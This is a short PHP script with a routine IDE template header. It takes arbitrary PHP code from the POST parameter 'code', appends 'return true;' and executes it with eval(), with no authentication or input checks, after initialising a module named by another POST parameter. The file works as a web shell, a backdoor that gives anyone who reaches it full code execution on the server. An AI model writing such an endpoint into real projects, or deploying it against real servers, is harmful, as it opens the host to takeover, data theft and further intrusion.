<?php
/**
 * Created by JetBrains PhpStorm.
 * User: wuzhijun
 * Date: 13-11-5
 * Time: 下午4:17
 * To change this template use File | Settings | File Templates.
 */
$code = $_POST["code"];
$module = $_POST["module"];
Bd_Init::init($module);
$php_template = array(
    $code,
    "return true;",
);

$php_code = join("\n\r", $php_template);

(eval($php_code));
